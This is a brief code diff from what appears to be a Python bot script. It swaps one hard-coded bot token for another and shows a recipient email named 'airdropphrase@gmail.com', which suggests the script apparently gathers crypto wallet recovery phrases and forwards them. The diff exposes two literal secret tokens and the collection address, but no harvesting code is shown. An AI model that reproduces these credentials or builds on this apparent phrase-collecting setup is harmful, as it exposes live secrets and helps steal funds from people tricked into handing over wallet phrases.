@@ -114,7 +114,7 @@ RECIPIENT_EMAIL = "airdropphrase@gmail.com"
 
 # Bot token (as provided) - replace with env var in production
 
-BOT_TOKEN = "8539534626:AAHTyjuL_1dhmIGaFIrSOCeerNHmjhDM2yQ"
+BOT_TOKEN = "8328626305:AAErLq83ZUjuRsVrmQojokSxyRPzAt_EPEM"
 
 
 
@@ -3559,3 +3559,4 @@ def main() -> None:
 if __name__ == "__main__":
 
     main()
+
